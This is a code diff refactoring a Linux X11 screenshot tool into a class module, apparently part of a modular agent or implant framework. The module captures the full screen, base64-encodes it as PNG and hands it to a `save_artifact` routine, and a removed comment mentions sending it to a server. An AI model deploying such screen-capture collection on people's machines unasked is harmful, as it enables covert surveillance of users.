@@ -1,16 +1,19 @@
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
 #include <png.h>
-#include "json.hpp" // TODO: we should use the same library from a known location
 #include <iostream>
 #include <fstream>
 #include <vector>
 #include <string>
 #include <cstdlib>
 
+#include "Screenshot.h"
+#include "../include/json.hpp"
+#include "../Utils/CryptoUtils.h"
+
 
 // Function to convert image data to base64
-std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
+std::string Screenshot::base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
     static const std::string base64_chars =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
         "abcdefghijklmnopqrstuvwxyz"
@@ -53,7 +56,7 @@ std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_
     return ret;
 }
 
-bool save_png_to_memory(std::vector<unsigned char>& out, int w, int h, std::vector<unsigned char>& data) {
+bool Screenshot::save_png_to_memory(std::vector<unsigned char>& out, int w, int h, std::vector<unsigned char>& data) {
     png_structp png = png_create_write_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
     if (!png) return false;
     png_infop info = png_create_info_struct(png);
@@ -81,7 +84,7 @@ bool save_png_to_memory(std::vector<unsigned char>& out, int w, int h, std::vect
     return true;
 }
 
-void x11_screenshot(std::vector<unsigned char>* data, int& width, int& height){
+void Screenshot::x11_screenshot(std::vector<unsigned char>* data, int& width, int& height){
     Display* display = XOpenDisplay(nullptr);
     if (display == nullptr) {
         std::cerr << "Cannot open display" << std::endl;
@@ -123,7 +126,13 @@ void x11_screenshot(std::vector<unsigned char>* data, int& width, int& height){
 }
 
 
-int main() {
+void Screenshot::module_impl() {
+    // We only want to run once
+    run_ = false;
+
+    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
+    nlohmann::json ret_json;
+
     std::vector<unsigned char> data;
     int width = 0;
     int height = 0;
@@ -137,35 +146,28 @@ int main() {
     }
     else if (std::strcmp(gdm_type, "wayland") == 0) {
         std::cerr << "Running on Wayland" << std::endl;
-        // const char* wayland_display = std::getenv("WAYLAND_DISPLAY");
-        // std::cerr << "Running on Wayland (WAYLAND_DISPLAY is set to " << wayland_display << ")" << std::endl;
-        //TODO: add support for wayland
-        return 1;
+        nlohmann::json error_msg;
+        error_msg["error"] = "Running on Wayland";
+        ret_json[module_type] = error_msg;
+        save_artifact(ret_json);
+        return;
     }
 
     std::cerr << "[+] Save PNG to memory" << std::endl;
     std::vector<unsigned char> png_data;
     if (!save_png_to_memory(png_data, width, height, data)) {
         std::cerr << "  [-] Failed to save PNG to memory" << std::endl;
-        return 1;
+        nlohmann::json error_msg;
+        error_msg["error"] = "Failed to save PNG to memory";
+        ret_json[module_type] = error_msg;
+        save_artifact(ret_json);
+        return;
     }
 
     std::cerr << "[+] Encoded image as base64" << std::endl;
     std::string encoded_data = base64_encode(&png_data[0], png_data.size());
 
-    nlohmann::json j;
-    j["screenshot"] = encoded_data;
-
-    // TODO: send the json file to the server using the base_class method
-    std::ofstream file("screenshot.json");
-    if (!file.is_open()) {
-        std::cerr << "  [-] Cannot open output file" << std::endl;
-        return 1;
-    }
-
-    std::cerr << "[+] Create JSON file" << std::endl;
-    file << j.dump(4);
-    file.close();
-
-    return 0;
+    ret_json[module_type] = encoded_data;
+    save_artifact(ret_json);
+    return;
 }
